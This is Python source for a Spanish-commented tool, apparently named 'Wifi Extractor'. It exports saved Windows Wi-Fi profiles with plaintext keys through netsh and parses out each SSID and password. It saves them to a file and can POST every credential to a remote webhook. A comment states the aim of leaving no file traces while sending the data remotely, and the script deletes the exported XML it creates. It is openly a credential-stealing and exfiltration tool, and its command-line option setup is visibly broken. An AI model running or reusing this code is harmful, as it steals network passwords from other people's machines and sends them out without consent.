import os, requests, subprocess, click
import xml.etree.ElementTree as t

#lista de exportaciones xml que genera el netsh y Wifis
Archivos_XML_WIFI = []
WIFIs = []

@click.command()
@click.option('--url', '-u', is_flag=True, default='', help='Webhook/POST URL')
@click.option('--help', '-h', is_flag=True, help='Help')
@click.option('--only-webhook', '-o', is_flag=True, help='Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)')
@click.option('--only-webhook', '-o', is_flag=True, help='Version')

def help():
    print('''
    Wifi Extractor
    
    -u, --url: Webhook/POST URL (optional)
    -h, --help: Help/Ayuda
    -o, --only-webhook (optional): Only send data to webhook (no txt file) | Envía los datos solo a la webhook (sin crear el archivo txt)
    
    GitHub: https://github.com/hrdax/WIFI_Extractor
    ''')

def main():
    #crea el archivo txt
    txt = open("Extracciones.txt", "w")

    #corre el comando en la command prompt
    cmd = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output=True).stdout.decode()

    #guarda la ruta actual
    ruta = os.getcwd()

    #recorre los archivos en la ruta
    for archivo in os.listdir(ruta):
        #encuentra los archivos xml exportados y los agrega
        if archivo.endswith(".xml"):
            Archivos_XML_WIFI.append(archivo)

    #contador para la lista de wifis
    conta = 0

    #recorre los archivos xml
    for archivo in Archivos_XML_WIFI:
        tr = t.parse(archivo)
        rt = tr.getroot()
        ssid = rt[1][0][1].text
        contrasena = rt[4][0][1][2].text
        ssid_contrasena = f"Nombre/SSID: {ssid} || CONTRASEÑA/PASSWORD: {contrasena}"
        WIFIs.append(ssid_contrasena)
        txt.write(WIFIs[conta]+"\n")
        conta = conta + 1
        os.remove(archivo)

    #ciera el archivo txt
    txt.close()

#envia a la url de webhook si se especifica con la opcion -u
def urlweb(url):
    if url == '':
        print('URL No especificada/No URL specified')
        exit()
    else:
        #guarda la url de webhook en caso de no querer dejar rastros de archivos y usar webhook para enviar los datos remotamente a nuestro dispositivo
        urlpost = url
        #envia los datos a la url de webhook
        for i in WIFIs:
            requests.post(urlpost, data=i)